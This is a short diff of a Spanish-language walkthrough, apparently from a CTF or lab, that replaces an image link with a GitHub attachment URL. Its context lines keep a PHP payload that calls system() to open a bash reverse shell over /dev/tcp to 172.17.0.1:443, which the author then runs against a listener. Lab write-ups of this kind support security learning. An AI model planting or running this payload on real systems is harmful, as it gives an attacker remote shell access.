@@ -87,7 +87,8 @@ entonces modificamos ese código dentro del paréntesis y colocamos así la reve
 
      - <?php echo system('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"'); ?>
 
-![[reverse .png]]
+![image](https://github.com/user-attachments/assets/dd901b2f-9972-4bb1-bc5c-1c9021d462c7)
+
 
 entonces la lanzamos con el terminal en escucha y entramos.
 ![[conexion .png]]
